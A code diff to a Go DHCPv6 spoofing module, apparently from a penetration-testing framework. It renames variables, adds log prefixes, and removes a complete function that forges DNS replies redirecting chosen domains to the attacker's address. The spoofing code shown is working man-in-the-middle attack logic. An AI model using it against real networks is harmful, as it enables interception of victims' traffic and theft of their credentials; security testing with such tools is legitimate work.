@@ -138,14 +138,14 @@ func (s *DHCP6Spoofer) Configure() error {
 }
 
 func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
-	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
 
 	fqdn := target.String()
 	if raw, found := solicit.Options[packets.DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
 		fqdn = string(raw[0])
 	}
 
-	log.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", core.Bold(fqdn), target, len(s.Domains))
+	log.Info("[%s] Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", core.Green("dhcp6"), core.Bold(fqdn), target, len(s.Domains))
 
 	var solIANA dhcp6opts.IANA
 
@@ -225,7 +225,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 		NextHeader: layers.IPProtocolUDP,
 		HopLimit:   64,
 		SrcIP:      s.Session.Interface.IPv6,
-		DstIP:      pktIp6.SrcIP,
+		DstIP:      pip6.SrcIP,
 	}
 
 	udp := layers.UDP{
@@ -254,7 +254,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
 	log.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", core.Bold(target.String()), toType)
 
-	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
 	reply := dhcp6.Packet{
 		MessageType:   dhcp6.MessageTypeReply,
 		TransactionID: req.TransactionID,
@@ -316,7 +316,7 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 		NextHeader: layers.IPProtocolUDP,
 		HopLimit:   64,
 		SrcIP:      s.Session.Interface.IPv6,
-		DstIP:      pktIp6.SrcIP,
+		DstIP:      pip6.SrcIP,
 	}
 
 	udp := layers.UDP{
@@ -348,86 +348,13 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 		}
 
 		if t, found := s.Session.Targets.Targets[target.String()]; found == true {
-			log.Info("IPv6 address %s is now assigned to %s", addr.String(), t)
+			log.Info("[%s] IPv6 address %s is now assigned to %s", core.Green("dhcp6"), addr.String(), t)
 		} else {
-			log.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
+			log.Info("[%s] IPv6 address %s is now assigned to %s", core.Green("dhcp6"), addr.String(), target)
 		}
 	} else {
 		log.Debug("DHCPv6 renew sent to %s", target)
 	}
-}
-
-func (s *DHCP6Spoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, req *layers.DNS, target net.HardwareAddr) {
-	redir := fmt.Sprintf("(->%s)", s.Address)
-	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
-		log.Info("Sending spoofed DNS reply for %s %s to %s.", core.Red(domain), core.Dim(redir), core.Bold(t.String()))
-	} else {
-		log.Info("Sending spoofed DNS reply for %s %s to %s.", core.Red(domain), core.Dim(redir), core.Bold(target.String()))
-	}
-
-	pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
-
-	eth := layers.Ethernet{
-		SrcMAC:       peth.DstMAC,
-		DstMAC:       target,
-		EthernetType: layers.EthernetTypeIPv6,
-	}
-
-	ip6 := layers.IPv6{
-		Version:    6,
-		NextHeader: layers.IPProtocolUDP,
-		HopLimit:   64,
-		SrcIP:      pip.DstIP,
-		DstIP:      pip.SrcIP,
-	}
-
-	udp := layers.UDP{
-		SrcPort: pudp.DstPort,
-		DstPort: pudp.SrcPort,
-	}
-
-	udp.SetNetworkLayerForChecksum(&ip6)
-
-	answers := make([]layers.DNSResourceRecord, 0)
-	for _, q := range req.Questions {
-		answers = append(answers,
-			layers.DNSResourceRecord{
-				Name:  []byte(q.Name),
-				Type:  q.Type,
-				Class: q.Class,
-				TTL:   1024,
-				IP:    s.Address,
-			})
-	}
-
-	dns := layers.DNS{
-		ID:        req.ID,
-		QR:        true,
-		OpCode:    layers.DNSOpCodeQuery,
-		QDCount:   req.QDCount,
-		Questions: req.Questions,
-		Answers:   answers,
-	}
-
-	err, raw := packets.Serialize(&eth, &ip6, &udp, &dns)
-	if err != nil {
-		log.Error("Error serializing packet: %s.", err)
-		return
-	}
-
-	log.Debug("Sending %d bytes of packet ...", len(raw))
-	if err := s.Session.Queue.Send(raw); err != nil {
-		log.Error("Error sending packet: %s", err)
-	}
-}
-
-func (s *DHCP6Spoofer) shouldSpoof(domain string) bool {
-	for _, d := range s.Domains {
-		if strings.HasSuffix(domain, d) == true {
-			return true
-		}
-	}
-	return false
 }
 
 func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
@@ -457,24 +384,6 @@ func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 				rawServerID := raw[0]
 				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
 					s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
-				}
-			}
-		}
-
-		return
-	}
-
-	// DNS request for us?
-	if bytes.Compare(eth.DstMAC, s.Session.Interface.HW) == 0 {
-		dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
-		if parsed == true && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
-			for _, q := range dns.Questions {
-				qName := string(q.Name)
-				if s.shouldSpoof(qName) == true {
-					s.dnsReply(pkt, eth, udp, qName, dns, eth.SrcMAC)
-					break
-				} else {
-					log.Debug("Skipping domain %s", qName)
 				}
 			}
 		}
